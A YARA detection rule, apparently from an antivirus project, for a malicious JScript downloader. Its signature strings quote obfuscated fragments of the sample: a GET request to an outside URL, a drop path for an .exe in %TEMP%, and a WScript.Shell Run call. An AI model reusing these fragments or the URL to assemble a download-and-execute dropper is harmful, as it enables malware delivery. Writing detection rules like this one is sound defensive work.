rule sig_20160328_7c72ddfb9e5a07bed7dc8a772caaab5c {
  meta:
    description = "datamaliciousorder - file 20160328_7c72ddfb9e5a07bed7dc8a772caaab5c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0b7429c91d12abf000adda835d1baa2a007cf9fc4c31136c4c68f7580c5d2c11"

  strings:
    $s1  = "function Pitmfms() {return Rzzsz[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"JLKdKZIAnmUJ2.exe\";};" fullword ascii
    $s2  = "do {WScript[Gackkc](Jzmstl() * 11)} while (Luzupmorgj[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Rzzsz = function Xbrtvfkly() {return WScript[Yobhx](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Injeqvsouq(Kjtfurnj, Thnfnarwfs){return Kjtfurnj - Thnfnarwfs;};" fullword ascii
    $s5  = "Luzupmorgj[Zaoupbih](\"GET\", \"http://www.stopeugenicsnow.eu/m8dhs\", false);" fullword ascii
    $s6  = "function Qmtjagzhwq(Pkerlenbbn){Rzzsz[\"Run\"](Pkerlenbbn, Fkdbaoryoz, Fkdbaoryoz);};" fullword ascii
    $s7  = "function Oeaxip() {return ((Qayio == true) && (Qayio == Fktpripzan)) ? 1 : Fkdbaoryoz;};" fullword ascii
    $s8  = "Fktpripzan = true; " fullword ascii
    $s9  = "function Btoiltfga(){return Yobhx;};" fullword ascii
    $s10 = "var Zuzlvjwee = false;" fullword ascii
    $s11 = "Qayio = true; " fullword ascii
    $s12 = "function Jzmstl(){return 22;};" fullword ascii
    $s13 = "var Hpiev = new this[\"Date\"]();" fullword ascii
    $s14 = "function Spitz(Pdswlc) {var Fmdmjzo = (1, 2, 3, 4, 5, Pdswlc); return Fmdmjzo;};" fullword ascii
    $s15 = "function Dvbiejxq(){return Mvkcyktot;};" fullword ascii
    $s16 = "var Fktpripzan = false;" fullword ascii
    $s17 = " while (Wdqvpnbv){" fullword ascii
    $s18 = "function Nttdn()" fullword ascii
    $s19 = "Kokqlvmvjl[\"position\"] = Spitz(Fkdbaoryoz);" fullword ascii
    $s20 = "return Injeqvsouq(Ngeaidu, Ftnahsglcw);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}